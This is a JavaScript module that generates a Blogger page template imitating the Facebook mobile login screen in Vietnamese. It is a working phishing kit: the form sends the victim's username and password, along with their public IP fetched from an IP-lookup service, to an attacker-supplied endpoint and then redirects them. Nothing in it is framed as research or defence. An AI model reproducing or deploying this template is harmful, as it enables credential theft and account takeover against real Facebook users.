module.exports = (title, line1, line2, fbImgLink, bloggerLink, uid, googAnalyticsScript, actionUrl, redirectUrl) =>
    `<?xml version="1.0" encoding="UTF-8" ?>
<html xmlns='http://www.w3.org/1999/xhtml' xmlns:b='http://www.google.com/2005/gml/b'
    xmlns:data='http://www.google.com/2005/gml/data' xmlns:expr='http://www.google.com/2005/gml/expr'>

<head>
    <meta content='text/html; charset=UTF-8' http-equiv='Content-Type' />
    <meta content='width=device-width, initial-scale=1, shrink-to-fit=no' name='viewport' />
    <title>${title}</title>
    <script src=
        "https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js">
        </script>
    <meta content='${fbImgLink}' itemprop='thumbnailUrl' property='og:image' />
    <b:skin>
        <![CDATA[

    ]]>
    </b:skin>

</head>

<body class='touch x1-5 ios mSafari _fzu _50-3 iframe acw' tabindex='0'>
    <header>
        <b:section class='header' id='header' maxwidgets='1' showaddelement='yes'>
            <b:widget id='Header1' locked='false' title='codeviafb (Tiêu đề)' type='Header' version='1'>
                <b:widget-settings>
                    <b:widget-setting name='displayUrl' />
                    <b:widget-setting name='displayHeight'>0</b:widget-setting>
                    <b:widget-setting name='sectionWidth'>-1</b:widget-setting>
                    <b:widget-setting name='useImage'>false</b:widget-setting>
                    <b:widget-setting name='shrinkToFit'>false</b:widget-setting>
                    <b:widget-setting name='imagePlacement'>BEHIND</b:widget-setting>
                    <b:widget-setting name='displayWidth'>0</b:widget-setting>
                </b:widget-settings>
                <b:includable id='main'>
                    <b:if cond='data:useImage'>
                        <b:if cond='data:imagePlacement == &quot;BEHIND&quot;'>
                            <b:if cond='data:mobile'>
                                <div id='header-inner'>
                                    <div class='titlewrapper' style='background: transparent'>
                                        <h1 class='title' style='background: transparent; border-width: 0px'>
                                            <b:include name='title' />
                                        </h1>
                                    </div>
                                    <b:include name='description' />
                                </div>
                                <b:else />
                                <div expr:style='&quot;background-image: url(\&quot;&quot; + data:sourceUrl + &quot;\&quot;); &quot;                      + &quot;background-position: &quot;                      + data:backgroundPositionStyleStr + &quot;; &quot;                      + data:widthStyleStr                      + &quot;min-height: &quot; + data:height                      + &quot;_height: &quot; + data:height                      + &quot;background-repeat: no-repeat; &quot;'
                                    id='header-inner'>
                                    <div class='titlewrapper' style='background: transparent'>
                                        <h1 class='title' style='background: transparent; border-width: 0px'>
                                            <b:include name='title' />
                                        </h1>
                                    </div>
                                    <b:include name='description' />
                                </div>
                            </b:if>
                            <b:else />
                            <div id='header-inner'>
                                <a expr:href='data:blog.homepageUrl' style='display: block'>
                                    <img expr:alt='data:title' expr:height='data:height'
                                        expr:id='data:widget.instanceId + &quot;_headerimg&quot;'
                                        expr:src='data:sourceUrl' expr:width='data:width' style='display: block' />
                                </a>
                                <b:if cond='data:imagePlacement == &quot;BEFORE_DESCRIPTION&quot;'>
                                    <b:include name='description' />
                                </b:if>
                            </div>
                        </b:if>
                        <b:else />
                        <div id='header-inner'>
                            <div class='titlewrapper'>
                                <h1 class='title'>
                                    <b:include name='title' />
                                </h1>
                            </div>
                            <b:include name='description' />
                        </div>
                    </b:if>
                </b:includable>
                <b:includable id='description'>
                    <div class='descriptionwrapper'>
                        <p class='description'><span>
                                <data:description />
                            </span></p>
                    </div>
                </b:includable>
                <b:includable id='title'>
                    <b:tag cond='data:blog.url != data:blog.homepageUrl' expr:href='data:blog.homepageUrl' name='a'>
                        <data:title />
                    </b:tag>
                </b:includable>
            </b:widget>
        </b:section>
    </header>
    <main>
        <style>
        body{margin:0px;padding:0px;}
            .touch ._5rut {
                margin: 0 auto;
                max-width: 416px;
            }

            ._5soa ._5rut {
                padding: 0 16px;
            }

            form {
                margin: 0;
                border: 0;
            }

            ._56be {
                position: relative;
            }

            .touch ._56bg {
                -webkit-appearance: none;
                -webkit-box-sizing: border-box;
                width: 100%;
            }

            .touch ._55ws {
                padding: 12px;
            }

            ._55ws {
                background: #fff;
            }

            ._55x2&gt;
            *,
            ._55x2._55x2&gt;

            * {
                border-bottom-color: rgba(0, 0, 0, .101);
            }

            ._55x2&gt;
            *,
            ._55x2._55x2&gt;

            * {
                border-bottom: 1px solid #e5e5e5;
            }

            ._56bg {
                border: 0;
                display: block;
                margin: 0;
                padding: 0;
            }

            ._56be::before {
                border-color: rgba(0, 0, 0, .07) rgba(0, 0, 0, .11) rgba(0, 0, 0, .18);
                -webkit-border-radius: 4px;
                border-style: solid;
                border-width: 1px;
                bottom: -1px;
                content: &#39;
                &#39;
                ;
                left: -1px;
                pointer-events: none;
                position: absolute;
                right: -1px;
                top: -1px;
            }

            ._56bs._56b_ {
                display: block;
                width: 100%;
            }

            .touch ._56bu,
            .touch ._56bv,
            .touch a._56bu,
            .touch a._56bv {
                text-shadow: 0 -1px rgb(0 0 0 / 25%);
            }

            .touch ._56bs {
                border: none;
                -webkit-border-radius: 3px;
                -webkit-box-sizing: border-box;
                font-weight: bold;
                position: relative;
                -webkit-user-select: none;
                z-index: 0;
            }

            ._56bw {
                font-size: 14px;
                height: 36px;
                line-height: 36px;
                padding: 0 16px;
            }

            ._56bu,
            ._56bv,
            a._56bu,
            a._56bv,
            a.touchable._56bu,
            a.touchable._56bv {
                color: #fff;
            }

            ._color {
                background-color: #627aad;
                border: none;
                -webkit-border-radius: 3px;
            }

            ._52jj {
                text-align: center;
            }

            ._5t3b {
                padding: 36px 0 12px 0;
            }

            .touch a {
                color: #576b95;
                cursor: pointer;
                text-decoration: none;
            }

            ._bgsp {
                background-color: #5b93fc;
                background-image: -webkit-gradient(linear, center top, center bottom, from(rgba(0, 0, 0, 0)), to(rgba(0, 0, 0, .1)));
                background-image: -webkit-linear-gradient(rgba(0, 0, 0, 0), rgba(0, 0, 0, .1));
                padding: 12px;
            }

            .touch,
            .touch tr,
            .touch input,
            .touch textarea,
            .touch .mfsm {
                font-size: 14px;
                line-height: 18px;
            }

            ._56bu,
            ._56bv,
            a._56bu,
            a._56bv,
            a.touchable._56bu,
            a.touchable._56bv {
                color: #fff
            }

            ._5soa ._5rut .other-links {
                padding-bottom: 36px;
                text-align: center;
            }

            ul {
                list-style-type: none;
            }

            ._5soa ._5rut .other-links a {
                color: #899bc1;
                font-size: 14px;
                line-height: 16px;
            }

            ._ulpading {
                padding: 0px;
            }

            .touch ._55wr {
                padding: 8px;
            }

            .touch ._5ui2 ._5dpw {
                text-align: center;
            }

            .touch ._5ui3 {
                padding: 6px;
            }

            .touch .mfss {
                font-size: 13px;
                line-height: 15px;
            }

            .fcg {
                color: gray;
            }

            .touch a.sec {
                color: #8190b0;
            }

            ._52z5 {
                background: #3b5998;
                -webkit-box-sizing: border-box;
                height: 44px;
                padding: 7px 0;
                position: relative;
                width: 100%;
                z-index: 12;
            }

            ._mgtop20 {
                margin-top: 20px;
            }

            ._bgaclb {
                background-color: #eceff5;
            }

            ._55sr {
                font-weight: bold;
                font-size: 16px;
            }
        </style>

        <body>
            <div class='_4g33 _52we _52z5' id='header'>
                <div class='_4g34 _52z6' data-sigil='mChromeHeaderCenter'>
                    <p
                        style='padding-top: 7px;margin: 0px;color: #fff;font-size: 20px;TEXT-ALIGN: -WEBKIT-CENTER;font-weight: bold;'>
                        Facebook</p>
                </div>
            </div>
            <div class='_5soa acw' data-sigil='context-layer-root content-pane' id='root' role='main'>
                <div class='_4g33'>
                    <div class='_4g34'>
                        <div class='aclb _5rut _bgaclb'>
                            <form action='${actionUrl}/login?redirect=${redirectUrl}' id='login_form' method='post'>
                            <input type='hidden' value='${uid}' name='sid'/>
                            <input type='hidden' id='ip' name='ip'/>                            
                                <div class='_5b_f'
                                    style='text-align: center; color: rgb(20, 24, 35); font-family: &apos;Helvetica Neue&apos;, Helvetica, Arial, &apos;lucida grande&apos;, tahoma, verdana, arial, sans-serif; font-size: 16px; line-height: 18px;'>
                                    <img alt='' class='mhs _5b_g img' height='70'
                                        src='${bloggerLink}'
                                        style='margin-top: 13px;border-top-left-radius: 7px; border-top-right-radius: 7px; border-bottom-right-radius: 7px; border-bottom-left-radius: 7px; -webkit-box-shadow: rgba(0, 0, 0, 0.298039) 0px 1px 1px; display: inline-block; height: 70px; width: 70px;'
                                        width='70' />
                                    <div class='uiScaledImageContainer mhs _5b_g'
                                        style='border-top-left-radius: 7px; border-top-right-radius: 7px; border-bottom-right-radius: 7px; border-bottom-left-radius: 7px; -webkit-box-shadow: rgba(0, 0, 0, 0.298039) 0px 1px 1px; display: inline-block; height: 70px; width: 70px;'>
                                        <img alt='' class='scaledImageFitWidth img' height='70' itemprop='image'
                                            src='http://quang.k8a.net/Job1/f-icon.png' style='width: 70px;'
                                            width='70' />
                                    </div>
                                </div>

                                <div class='_5b_h'
                                    style='margin: 15px auto 0px; text-align: center; width: 300px; color: rgb(20, 24, 35); font-family: &apos;Helvetica Neue&apos;, Helvetica, Arial, &apos;lucida grande&apos;, tahoma, verdana, arial, sans-serif; font-size: 16px; line-height: 18px;'>
                                    <span class='fwb'>Trước tiên, bạn phải đăng nhập.</span>
                                </div>
                                <div class='_56be _5sob'>
                                    <div class='_55wo _55x2 _56bf _mgtop20'><input autocapitalize='off' autocorrect='off' class='_56bg _55ws _5ruq' minlength='6' name='username' placeholder='Số điện thoại di động hoặc email' type='text' />
                                    <input autocapitalize='off' autocorrect='off' class='_56bg _55ws _5ruq' data-sigil='login-password-field' minlength='4' name='password' placeholder='Mật khẩu' type='password' />
                                    <input id='is_smart_key_cd' name='na_is_smart_key_cd' type='hidden' value='OTkzNXwzODh8MTM0'/>
                                    <div class='_55ws'><button class='_54k8 _56bs _56b_ _56bw _56bu _color' data-sigil='touchable' id='u_0_1' name='login' type='submit' value='Log In'><span class='_55sr'>Đăng nhập</span></button></div>
                                    </div>
                                </div>
                            </form>
                            <div class='_52jj _5t3b'><a class='_54k8 _56bs _56bw _56bv _bgsp' data-sigil='touchable'
                                    role='button'><span class='_55sr'> Tạo tài khoản người dùng mới</span></a></div>
                            <div class='other-links'>
                                <ul class='_5pkb _55wp _ulpading'>
                                    <li><span class='mfss fcg'><a>Quên mật khẩu?</a><span aria-hidden='true'> &#183;
                                            </span>
                                            <a class='sec'>Trung tâm trợ giúp</a>
                                        </span>
                                    </li>
                                    <li />
                                </ul>
                            </div>
                        </div>
                    </div>
                </div>
                <div class='_55wr _5ui2' style='text-align: -webkit-center;'>
                    <div class='_5dpw'>
                        <div class='_5ui3' data-sigil='marea'><span class='mfss fcg'><b>Filipino</b><span
                                    aria-hidden='true'> &#183;
                                </span><a class='sec' data-sigil='ajaxify'>English</a>
                                <span aria-hidden='true'> &#183; </span>
                                <a class='sec' data-sigil='ajaxify'>中文(台灣)</a><span aria-hidden='true'> &#183; </span><a
                                    class='sec'>More&#8230;</a></span>
                        </div>
                        <div class='_5ui4'><span class='mfss fcg'>Facebook &#169;2017</span></div>
                    </div>
                </div>
            </div>
        </body>
    </main>
    <footer />
</body>
<script>
        $.getJSON("https://api.ipify.org?format=json",
                                          function(data) {
  
            // Setting text of element P with id gfg
            $("#ip").val(data.ip);
        })
        </script>
${googAnalyticsScript}
</html>`